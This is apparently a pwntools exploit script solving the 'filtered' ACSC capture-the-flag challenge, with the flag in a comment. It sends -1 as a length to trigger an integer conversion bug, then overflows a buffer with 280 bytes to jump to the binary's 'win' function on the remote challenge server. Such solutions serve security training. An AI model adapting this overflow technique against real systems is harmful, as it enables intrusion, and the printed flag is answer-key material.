from pwn import *

# ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}

elf = ELF('filtered')
context.update(os='linux', arch='amd64', binary=elf)

host = 'filtered.chal.acsc.asia'
port = 9001

if args.LOCAL:
    p = elf.process()
else:
    p = remote(host, port)

offset = 280
p.sendline(b'-1')
p.recvuntil(b'Data: ')

payload = b'A' * offset
payload += p64(elf.symbols['win'])

p.sendline(payload)

p.interactive()

p.close()
